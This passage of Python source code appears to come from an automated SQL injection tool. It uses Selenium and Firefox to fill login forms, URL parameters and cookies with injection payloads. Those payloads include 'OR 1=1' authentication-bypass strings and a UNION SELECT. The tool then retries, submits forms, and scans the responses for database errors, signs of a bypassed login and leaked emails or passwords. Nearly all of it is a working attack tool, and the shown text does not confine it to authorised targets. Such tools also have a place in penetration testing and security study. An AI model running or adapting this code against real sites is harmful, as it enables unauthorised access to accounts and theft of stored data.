                "' OR 1=1 --",    # Variation with comment
                "' OR '1'='1' --",# Variation with comment
                "admin'; --",     # SQL Server style
                "1' OR '1' = '1", # Variation without trailing quote
                "a' UNION SELECT 1,2,3 --", # UNION attack
                "' OR 1=1 LIMIT 1; --"  # Limiting to first record
            ]
        
        result = {
            'success': False,
            'response_text': '',
            'screenshot_path': None,
            'error_message': None,
            'payloads_tried': []
        }
        
        # Try each payload until one works or we exhaust the list
        for i, payload in enumerate(payloads):
            logger.info(f"Trying payload {i+1}/{len(payloads)}: {payload}")
            result['payloads_tried'].append(payload)
            
            # Create a copy of form_fields with the same payload for all fields
            injection_fields = {}
            for field_name, selector in form_fields.items():
                if field_name != 'form_container':  # Skip the form container
                    injection_fields[field_name] = selector
            
            # Execute the injection with this payload
            injection_result = self._execute_form_fields_injection(
                driver, injection_fields, payload, capture_screenshot, max_retries, popup_timeout
            )
            
            # Parse the result
            if "Success" in injection_result and "Failed" not in injection_result:
                logger.info(f"Payload {i+1} was successful")
                return injection_result
            else:
                logger.info(f"Payload {i+1} was unsuccessful, trying next payload")
                
                # Try to check if we need to navigate back to the form
                try:
                    # Check if we're still on a page with the form
                    found_form = False
                    for field_name, selector in form_fields.items():
                        if field_name != 'form_container':  # Skip the form container
                            try:
                                elements = driver.find_elements(By.CSS_SELECTOR, selector)
                                if elements and elements[0].is_displayed():
                                    found_form = True
                                    break
                            except:
                                pass
                    
                    # If we're not on the form page anymore, navigate back to the original URL
                    if not found_form:
                        logger.info("Form not found, navigating back to the original URL")
                        driver.get(driver.current_url)
                        time.sleep(1)  # Brief pause to let the page load
                        self._handle_alerts_and_popups(driver, popup_timeout)
                except Exception as e:
                    logger.warning(f"Error while checking form presence: {str(e)}")
        
        # If we get here, none of the payloads worked
        result['error_message'] = f"All {len(payloads)} payloads were unsuccessful"
        formatted_result = "Firefox SQL Injection Execution Result\n\n"
        formatted_result += "Execution Status: Failed\n"
        formatted_result += f"Error: {result['error_message']}\n\n"
        formatted_result += "Payloads Tried:\n"
        for i, payload in enumerate(result['payloads_tried']):
            formatted_result += f"  {i+1}. {payload}\n"
        
        return formatted_result

    def _handle_alerts_and_popups(self, driver, timeout=3):
        """
        Handle any alerts, confirmation dialogs, or modal popups on the page.
        
        Args:
            driver: The Selenium WebDriver instance
            timeout: Maximum time to wait for alerts/popups
        """
        logger.info("Checking for alerts and popups")
        
        # First, check for JavaScript alerts with shorter timeout
        try:
            WebDriverWait(driver, 1).until(EC.alert_is_present())
            alert = Alert(driver)
            alert_text = alert.text
            logger.info(f"Alert detected: {alert_text}")
            alert.accept()
            logger.info("Alert accepted")
        except TimeoutException:
            logger.info("No JavaScript alerts detected")
        
        # Reduced list of most common popup selectors
        popup_selectors = [
            ".modal", "#modal", ".popup", "#popup", 
            "[class*='dialog']", ".cookie-banner", 
            ".overlay", "#overlay"
        ]
        
        # Check for modal popups with faster timeouts
        for selector in popup_selectors:
            try:
                popup = WebDriverWait(driver, 1).until(
                    EC.presence_of_element_located((By.CSS_SELECTOR, selector))
                )
                
                # Check if popup is visible
                if popup.is_displayed():
                    logger.info(f"Popup detected with selector: {selector}")
                    
                    # Try to find close buttons with most common patterns
                    close_selectors = [
                        f"{selector} .close", f"{selector} .btn-close",
                        f"{selector} button[class*='close']", f"{selector} [aria-label='Close']",
                        f"{selector} button"
                    ]
                    
                    popup_closed = False
                    for close_selector in close_selectors:
                        try:
                            close_btn = WebDriverWait(driver, 0.5).until(
                                EC.element_to_be_clickable((By.CSS_SELECTOR, close_selector))
                            )
                            logger.info(f"Found popup close button: {close_selector}")
                            close_btn.click()
                            popup_closed = True
                            logger.info("Popup closed successfully")
                            break
                        except (TimeoutException, NoSuchElementException, ElementNotInteractableException):
                            continue
                    
                    # If we couldn't find a close button, try pressing Escape key
                    if not popup_closed:
                        logger.info("No close button found, trying Escape key")
                        webdriver.ActionChains(driver).send_keys(Keys.ESCAPE).perform()
            except (TimeoutException, NoSuchElementException):
                continue
        
        # Skip iframe checking as it's an expensive operation with recursive calls
        # If needed, it can be enabled with a command line flag
    
    def _execute_form_fields_injection(self, driver, form_fields, payload, capture_screenshot, max_retries, popup_timeout):
        """
        Execute injection when multiple form fields are provided instead of a single selector.
        This is useful for login forms with username and password fields.
        """
        result = {
            'success': False,
            'response_text': '',
            'screenshot_path': None,
            'error_message': None,
            'payloads_used': {}  # Track which payload was used for each field
        }

        for attempt in range(max_retries):
            try:
                logger.info(f"Form fields injection attempt {attempt+1}/{max_retries}")
                self._handle_alerts_and_popups(driver, popup_timeout)

                all_fields_found = True
                last_field_element = None

                for field_name, field_selector in form_fields.items():
                    if field_name == 'form_container':
                        continue

                    if not field_selector or not isinstance(field_selector, str):
                        logger.error(f"Invalid selector for field '{field_name}': {field_selector}")
                        all_fields_found = False
                        continue

                    logger.info(f"Looking for field '{field_name}' with selector '{field_selector}'")
                    try:
                        field_element = WebDriverWait(driver, 3).until(
                            EC.presence_of_element_located((By.CSS_SELECTOR, field_selector))
                        )

                        if not field_element.is_displayed() or not field_element.is_enabled():
                            logger.warning(f"Field '{field_name}' found but not interactable")
                            all_fields_found = False
                            continue

                        driver.execute_script("arguments[0].scrollIntoView({block: 'center'});", field_element)
                        time.sleep(0.5)

                        WebDriverWait(driver, 3).until(
                            EC.element_to_be_clickable((By.CSS_SELECTOR, field_selector))
                        )

                        field_element.click()
                        field_element.clear()
                        field_element.send_keys(payload)
                        logger.info(f"Filled field '{field_name}' with payload: {payload}")
                        result['payloads_used'][field_name] = payload
                        last_field_element = field_element

                    except Exception as e:
                        logger.error(f"Error processing field '{field_name}': {str(e)}")
                        all_fields_found = False
                        continue

                if not all_fields_found:
                    if attempt == max_retries - 1:
                        result['error_message'] = "Could not find or interact with all form fields"
                        return self._format_result(result)
                    else:
                        logger.info("Retrying due to missing or invalid fields")
                        time.sleep(0.5)
                        continue

                logger.info("Attempting to submit the form")
                submit_success = False

                try:
                    submit_button = None
                    submit_selectors = [
                        'button[type="submit"]', 'input[type="submit"]',
                        '.submit-button', '#submit', 'button.login-button', 'button.signin-button'
                    ]

                    for selector in submit_selectors:
                        try:
                            submit_button = driver.find_element(By.CSS_SELECTOR, selector)
                            if submit_button.is_displayed() and submit_button.is_enabled():
                                logger.info(f"Found submit button with selector: {selector}")
                                submit_button.click()
                                submit_success = True
                                break
                        except:
                            continue

                    if not submit_success and last_field_element:
                        logger.info("No submit button found, pressing Enter on last field")
                        last_field_element.send_keys(Keys.RETURN)
                        submit_success = True

                    if not submit_success:
                        logger.info("Trying to submit form via JavaScript")
                        driver.execute_script("arguments[0].form.submit();", last_field_element)
                        submit_success = True

                except Exception as e:
                    logger.error(f"Error during form submission: {str(e)}")

                self._handle_alerts_and_popups(driver, popup_timeout)
                time.sleep(1)
                self._handle_alerts_and_popups(driver, popup_timeout)

                result['response_text'] = driver.page_source
                result['success'] = True
                logger.info("Response captured successfully")
                break

            except Exception as e:
                logger.error(f"Error in form fields injection attempt {attempt+1}: {str(e)}")
                if attempt == max_retries - 1:
                    result['error_message'] = str(e)
                    return self._format_result(result)
                else:
                    logger.info(f"Retrying after error: {str(e)}")
                    time.sleep(0.5)

        formatted_result = "Firefox SQL Injection Execution Result\n\n"
        formatted_result += f"Execution Status: {'Success' if result['success'] else 'Failed'}\n"

        if result['error_message']:
            formatted_result += f"Error: {result['error_message']}\n"

        formatted_result += "\nPayloads Used:\n"
        for field_name, used_payload in result['payloads_used'].items():
            formatted_result += f"  {field_name}: {used_payload}\n"

        if result['screenshot_path']:
            formatted_result += f"\nScreenshot saved: {result['screenshot_path']}\n"

        return formatted_result


    def _execute_injection(self, driver, entry_type, selector, selector_type, payload, capture_screenshot, max_retries, popup_timeout):
        result = {
            'success': False,
            'response_text': '',
            'screenshot_path': None,
            'error_message': None
        }
        
        # If selector is a dictionary, extract the actual selector string or convert to auto-detection
        if isinstance(selector, dict):
            logger.info(f"Dictionary passed as selector: {selector}, switching to auto-detection mode")
            # Switch to auto-detection mode
            form_fields = self._auto_detect_form_fields(driver)
            if form_fields:
                logger.info(f"Auto-detected form fields: {list(form_fields.keys())}")
                return self._execute_form_fields_injection(
                    driver, form_fields, payload, capture_screenshot, max_retries, popup_timeout
                )
            else:
                logger.warning("Auto-detection failed, using default input selector")
                selector = 'input[type="text"]'  # Fallback to a common input type
        
        # Continue with the regular injection process
        for attempt in range(max_retries):
            try:
                logger.info(f"Injection attempt {attempt+1}/{max_retries}")
                
                # Handle any alerts or popups before looking for elements
                self._handle_alerts_and_popups(driver, popup_timeout)
                
                # Check for empty or invalid selector
                if not selector or not isinstance(selector, str):
                    logger.error(f"Invalid selector: {selector}, switching to auto-detection mode")
                    # Switch to auto-detection mode
                    form_fields = self._auto_detect_form_fields(driver)
                    if form_fields:
                        logger.info(f"Auto-detected form fields: {list(form_fields.keys())}")
                        return self._execute_form_fields_injection(
                            driver, form_fields, payload, capture_screenshot, max_retries, popup_timeout
                        )
                    else:
                        logger.error("Auto-detection failed, cannot proceed with injection")
                        result['error_message'] = f"Invalid selector and auto-detection failed"
                        return self._format_result(result)
                
                # Find the target element with better error handling
                logger.info(f"Looking for element with selector '{selector}' using {selector_type}")
                try:
                    if selector_type.lower() == 'xpath':
                        element = WebDriverWait(driver, 5).until(
                            EC.presence_of_element_located((By.XPATH, selector))
                        )
                    else:  # Default to CSS selector
                        element = WebDriverWait(driver, 5).until(
                            EC.presence_of_element_located((By.CSS_SELECTOR, selector))
                        )
                    logger.info("Element found successfully")
                except TimeoutException:
                    logger.error(f"Element with selector '{selector}' not found within timeout period")
                    if attempt == max_retries - 1:  # If this is the last attempt
                        result['error_message'] = f"Could not find element with selector: {selector} after {max_retries} attempts"
                        return self._format_result(result)
                    else:
                        logger.info("Retrying after element not found...")
                        time.sleep(2)  # Wait before retrying
                        continue  # Try again
                
                # Check if the element is in view and scroll to it if needed
                try:
                    driver.execute_script("arguments[0].scrollIntoView({block: 'center'});", element)
                    logger.info("Scrolled element into view")
                except Exception as e:
                    logger.warning(f"Failed to scroll to element: {str(e)}")
                
                # Handle any alerts that may have appeared after scrolling
                self._handle_alerts_and_popups(driver, popup_timeout)
                
                # Perform the injection based on entry type
                if entry_type == 'form_input':
                    logger.info("Performing form input injection")
                    try:
                        # Ensure element is ready for interaction
                        WebDriverWait(driver, 3).until(
                            EC.element_to_be_clickable((By.XPATH, element.get_attribute("xpath")))
                        )
                        
                        # Clear existing content and inject payload into form input
                        element.click()  # Ensure focus
                        element.clear()
                        
                        # Send entire payload at once
                        element.send_keys(payload)
                        
                        logger.info(f"Payload injected: {payload}")
                        
                        # Handle any alerts that may have appeared during input
                        self._handle_alerts_and_popups(driver, popup_timeout)
                        
                        # First try: Press Enter directly on the element
                        try:
                            logger.info("Submitting form by pressing Enter key")
                            element.send_keys(Keys.RETURN)
                            success = True
                        except (ElementNotInteractableException, StaleElementReferenceException) as e:
                            logger.warning(f"Enter key submission failed: {str(e)}")
                            success = False
                        
                        # Handle any alerts that may have appeared after submission
                        self._handle_alerts_and_popups(driver, popup_timeout)
                        
                        # Second try: Look for a submit button if Enter didn't work
                        if not success:
                            try:
                                logger.info("Looking for submit button")
                                submit_buttons = []
                                
                                # Multiple strategies to find the submit button
                                if element.get_attribute('form'):
                                    form_id = element.get_attribute('form')
                                    form = driver.find_element(By.ID, form_id)
                                    submit_buttons = form.find_elements(By.CSS_SELECTOR, 'button[type="submit"], input[type="submit"]')
                                else:
                                    # Try to find the form by traversing up
                                    try:
                                        form = element.find_element(By.XPATH, './ancestor::form')
                                        submit_buttons = form.find_elements(By.CSS_SELECTOR, 'button[type="submit"], input[type="submit"]')
                                    except NoSuchElementException:
                                        # If no form found, look for nearby submit buttons
                                        logger.info("No form found, looking for nearby submit buttons")
                                
                                # If no submit buttons found, look in wider scope
                                if not submit_buttons:
                                    submit_buttons = driver.find_elements(By.CSS_SELECTOR, 'button[type="submit"], input[type="submit"], button.submit, input.submit, [class*="submit"], [id*="submit"]')
                                
                                if submit_buttons:
                                    logger.info(f"Found {len(submit_buttons)} potential submit buttons")
                                    # Click the first visible submit button
                                    for btn in submit_buttons:
                                        if btn.is_displayed():
                                            logger.info("Submit button found, clicking")
                                            btn.click()
                                            success = True
                                            break
                                else:
                                    logger.warning("No submit buttons found")
                            except Exception as e:
                                logger.warning(f"Submit button search/click failed: {str(e)}")
                                
                            # Handle any alerts that may have appeared after button click
                            self._handle_alerts_and_popups(driver, popup_timeout)
                            
                            # Third try: Try JavaScript submission
                            if not success:
                                try:
                                    logger.info("Attempting form submission via JavaScript")
                                    if element.get_attribute('form'):
                                        form_id = element.get_attribute('form')
                                        driver.execute_script(f"document.getElementById('{form_id}').submit();")
                                    else:
                                        try:
                                            driver.execute_script("arguments[0].form.submit();", element)
                                        except:
                                            # Try to find forms and submit the first one
                                            forms = driver.find_elements(By.TAG_NAME, "form")
                                            if forms:
                                                logger.info(f"Found {len(forms)} forms, attempting to submit the first one")
                                                driver.execute_script("arguments[0].submit();", forms[0])
                                    success = True
                                except Exception as e:
                                    logger.warning(f"JavaScript form submission failed: {str(e)}")
                    
                    except Exception as e:
                        logger.error(f"Error during form input injection: {str(e)}")
                        if attempt == max_retries - 1:  # If this is the last attempt
                            result['error_message'] = f"Form input injection failed: {str(e)}"
                            return self._format_result(result)
                        else:
                            logger.info("Retrying after form input failure...")
                            continue  # Try again
                
                elif entry_type == 'url_parameter':
                    logger.info("Performing URL parameter injection")
                    try:
                        # For URL parameters, we need to modify the URL directly
                        current_url = driver.current_url
                        if '?' in current_url:
                            modified_url = f"{current_url}&{selector}={payload}"
                        else:
                            modified_url = f"{current_url}?{selector}={payload}"
                        
                        logger.info(f"Navigating to modified URL: {modified_url}")
                        driver.get(modified_url)
                        
                        # Handle any alerts that may have appeared after navigation
                        self._handle_alerts_and_popups(driver, popup_timeout)
                    except Exception as e:
                        logger.error(f"Error during URL parameter injection: {str(e)}")
                        if attempt == max_retries - 1:  # If this is the last attempt
                            result['error_message'] = f"URL parameter injection failed: {str(e)}"
                            return self._format_result(result)
                        else:
                            logger.info("Retrying after URL parameter failure...")
                            continue  # Try again
                
                elif entry_type == 'cookie':
                    logger.info("Performing cookie-based injection")
                    try:
                        # For cookie-based injections
                        driver.add_cookie({'name': selector, 'value': payload})
                        logger.info("Cookie set, refreshing page")
                        driver.refresh()  # Refresh to apply the cookie
                        
                        # Handle any alerts that may have appeared after refresh
                        self._handle_alerts_and_popups(driver, popup_timeout)
                    except Exception as e:
                        logger.error(f"Error during cookie-based injection: {str(e)}")
                        if attempt == max_retries - 1:  # If this is the last attempt
                            result['error_message'] = f"Cookie-based injection failed: {str(e)}"
                            return self._format_result(result)
                        else:
                            logger.info("Retrying after cookie injection failure...")
                            continue  # Try again
                
                else:
                    logger.info(f"Unknown entry type '{entry_type}', defaulting to form input")
                    # Default to form input using the same robust approach
                    try:
                        # Clear existing content and inject payload
                        element.click()
                        element.clear()
                        element.send_keys(payload)
                        logger.info(f"Payload injected: {payload}")
                        
                        # Try to find and submit the form
                        try:
                            logger.info("Looking for form and submit button")
                            form = element.find_element(By.XPATH, './ancestor::form')
                            submit_button = form.find_element(By.CSS_SELECTOR, 'button[type="submit"], input[type="submit"]')
                            logger.info("Form and submit button found, clicking")
                            submit_button.click()
                        except NoSuchElementException:
                            logger.info("No form or submit button found, pressing Enter instead")
                            # If no submit button, try pressing Enter
                            element.send_keys(Keys.RETURN)
                            
                        # Handle any alerts that may have appeared after submission
                        self._handle_alerts_and_popups(driver, popup_timeout)
                    except Exception as e:
                        logger.error(f"Error during default form input injection: {str(e)}")
                        if attempt == max_retries - 1:  # If this is the last attempt
                            result['error_message'] = f"Default form input injection failed: {str(e)}"
                            return self._format_result(result)
                        else:
                            logger.info("Retrying after default form input failure...")
                            continue  # Try again
                
                # Wait for the page to load after submission
                logger.info("Waiting for response...")
                time.sleep(1)
                
                # Handle any final alerts that may have appeared
                self._handle_alerts_and_popups(driver, popup_timeout)
                
                # Capture the response
                result['response_text'] = driver.page_source
                result['success'] = True
                logger.info("Response captured successfully")
                
                # Capture a screenshot if requested
                if capture_screenshot:
                    logger.info("Capturing screenshot")
                    timestamp = datetime.now().strftime("%Y%m%d%H%M%S")
                    screenshot_dir = "screenshots"
                    os.makedirs(screenshot_dir, exist_ok=True)
                    screenshot_path = f"{screenshot_dir}/firefox_injection_{timestamp}.png"
                    driver.save_screenshot(screenshot_path)
                    result['screenshot_path'] = screenshot_path
                    logger.info(f"Screenshot saved to {screenshot_path}")
                    
                    # Also encode the screenshot as base64 for inline viewing
                    with open(screenshot_path, "rb") as img_file:
                        result['screenshot_base64'] = base64.b64encode(img_file.read()).decode()
                
                # Successful injection, break out of retry loop
                break
                
            except UnexpectedAlertPresentException:
                # Handle alerts that might have appeared unexpectedly
                logger.warning("Unexpected alert detected during injection")
                try:
                    alert = Alert(driver)
                    logger.info(f"Alert text: {alert.text}")
                    alert.accept()
                    logger.info("Alert accepted")
                except:
                    logger.warning("Failed to handle unexpected alert")
                
                if attempt == max_retries - 1:  # If this is the last attempt
                    result['error_message'] = "Unexpected alerts prevented successful injection"
                    return self._format_result(result)
                else:
                    logger.info("Retrying after handling unexpected alert...")
                    time.sleep(2)  # Wait before retrying
            
            except Exception as e:
                logger.error(f"Error in injection attempt {attempt+1}: {str(e)}")
                if attempt == max_retries - 1:  # If this is the last attempt
                    result['error_message'] = str(e)
                    return self._format_result(result)
                else:
                    logger.info(f"Retrying after error: {str(e)}")
                    time.sleep(0.5)  # Wait before retrying
        
        # Format and return the result
        return self._format_result(result)
        
    def _format_result(self, result):
        # Format the result as a string for return
        formatted_result = "Firefox SQL Injection Execution Result\n\n"
        
        if result['success']:
            formatted_result += "Execution Status: Success\n\n"
        else:
            formatted_result += f"Execution Status: Failed\n"
            formatted_result += f"Error: {result['error_message']}\n\n"
        
        formatted_result += "Response Analysis:\n"
        
        # Check for signs of successful injection
        if result.get('response_text'):
            # Look for database errors in the response
            db_error_patterns = [
                r"SQL syntax.*MySQL", r"Warning.*mysql_.*", r"MySQLSyntaxErrorException",
                r"valid MySQL result", r"ORA-[0-9][0-9][0-9][0-9]", r"Oracle error",
                r"SQL Server.*Driver", r"OLE DB.*SQL Server", r"Warning.*mssql_.*",
                r"SQLite/JDBCDriver", r"SQLite.Exception", r"PostgreSQL.*ERROR"
            ]
            
            for pattern in db_error_patterns:
                match = re.search(pattern, result['response_text'], re.IGNORECASE)
                if match:
                    formatted_result += f"  - Database Error Detected: {match.group(0)}\n"
            
            # Look for signs of authentication bypass
            auth_success_patterns = [
                r"Welcome.*admin", r"successfully logged in", r"authentication successful",
                r"logged in as", r"login successful", r"access granted"
            ]
            
            for pattern in auth_success_patterns:
                match = re.search(pattern, result['response_text'], re.IGNORECASE)
                if match:
                    formatted_result += f"  - Authentication Bypass Detected: {match.group(0)}\n"
            
            # Look for signs of data leakage
            data_patterns = [
                r"<td>\s*\d+\s*</td>", r"<td>.*?@.*?</td>",  # Email pattern in table cell
                r"<td>.*?password.*?</td>", r"username.*?password"
            ]
            
            for pattern in data_patterns:
                match = re.search(pattern, result['response_text'], re.IGNORECASE)
                if match:
                    formatted_result += f"  - Possible Data Leakage Detected: {match.group(0)}\n"
        
        if result.get('screenshot_path'):
            formatted_result += f"\nScreenshot saved to: {result['screenshot_path']}\n"
        
        return formatted_result 